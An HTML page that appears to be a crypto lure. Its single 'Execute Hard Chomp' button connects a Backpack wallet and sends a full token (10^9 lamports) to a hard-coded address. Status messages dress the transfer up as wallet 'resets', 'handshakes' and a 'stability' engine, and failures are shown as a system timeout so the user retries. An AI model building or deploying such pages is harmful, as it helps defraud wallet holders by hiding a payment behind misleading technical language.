<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BALOO BITE - V12 FINAL BOSS</title>
    <style>
        body { background: #000; color: #fff; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #0a0a0a; border: 2px solid #555; border-radius: 15px; padding: 30px; text-align: center; width: 350px; }
        .status-box { background: #001a00; color: #00ff00; padding: 15px; border: 1px solid #00ff00; font-size: 11px; margin-bottom: 25px; text-align: left; min-height: 95px; word-break: break-all; line-height: 1.4; }
        .btn-chomp { background: #ff8c00; color: #fff; border: none; padding: 22px; width: 100%; cursor: pointer; font-weight: bold; font-size: 20px; border-radius: 10px; text-transform: uppercase; }
        .btn-chomp:disabled { background: #1a1a1a; color: #444; cursor: not-allowed; }
    </style>
</head>
<body>

<div class="card">
    <div class="status-box" id="status">V12_ENGINE: READY<br>MODE: ULTRA_STABILITY</div>
    <div style="font-size: 32px; color: #ffcc00; margin-bottom: 25px; font-weight: bold;">1.0 XNT</div>
    <button class="btn-chomp" id="mainBtn" onclick="executeV12Chomp()">Execute Hard Chomp</button>
</div>

<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>

<script>
    async function executeV12Chomp() {
        const log = document.getElementById('status');
        const btn = document.getElementById('mainBtn');
        const provider = window.backpack;

        try {
            btn.disabled = true;
            log.innerHTML = "PHASE 1: RESETTING WALLET STATE...";
            
            // Geforceerde diepe reset
            if (provider.disconnect) await provider.disconnect().catch(() => {});
            await new Promise(r => setTimeout(r, 1500)); 
            
            log.innerHTML = "PHASE 2: NEW HANDSHAKE...";
            await provider.connect();

            const tx = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: provider.publicKey,
                    toPubkey: new solanaWeb3.PublicKey("BAavP6nxHDkVDowYXoyDaNDbc9CAgncfDPELAyjzoyTq"),
                    lamports: 1000000000 
                })
            );

            log.innerHTML = "PHASE 3: AWAITING WALLET...";
            const result = await provider.signAndSendTransaction(tx);
            log.innerHTML = "VERIFIED SUCCESS!<br>SIG: " + result.signature.toString().substring(0, 22);

        } catch (err) {
            console.error(err);
            log.innerHTML = "NOTICE: WALLET TIMEOUT<br>STABILIZING SYSTEM... PLEASE WAIT.";
        } finally {
            let countdown = 10;
            const timer = setInterval(() => {
                btn.innerText = `COOLDOWN: ${countdown}s`;
                countdown--;
                if (countdown < 0) {
                    clearInterval(timer);
                    btn.disabled = false;
                    btn.innerText = "Execute Hard Chomp";
                }
            }, 1000);
        }
    }
</script>
</body>
</html>
